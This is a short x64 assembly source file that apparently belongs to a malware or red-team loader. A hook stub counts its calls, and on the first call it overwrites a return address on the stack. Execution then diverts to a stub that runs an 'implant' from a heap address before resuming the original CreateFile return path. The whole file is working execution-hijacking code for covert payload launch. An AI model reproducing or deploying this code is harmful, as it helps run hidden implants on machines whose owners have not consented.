.data
extern MainAddr:QWORD
extern Global_OrigCreateFileReturnAddr:QWORD
extern HeapAddress:QWORD
extern SizeOfStack:QWORD
count DWORD 000h

.code
PUBLIC ExecImplantStub
PUBLIC HookStub

    ExecImplantStub PROC

        call HeapAddress
        mov rcx, [Global_OrigCreateFileReturnAddr]
        jmp rcx

    ExecImplantStub ENDP


    HookStub PROC

        inc count
        cmp count, 1
        jne skip
        mov rax, [SizeOfStack]        
        mov rbx, rsp                 
        add rbx, rax                  
        mov rax, qword ptr [rbx]      
        mov[Global_OrigCreateFileReturnAddr], rax
        lea rax, ExecImplantStub
        mov qword ptr[rbx], rax

    HookStub ENDP

    skip PROC

        mov rax, [MainAddr]
        jmp rax

    skip ENDP

end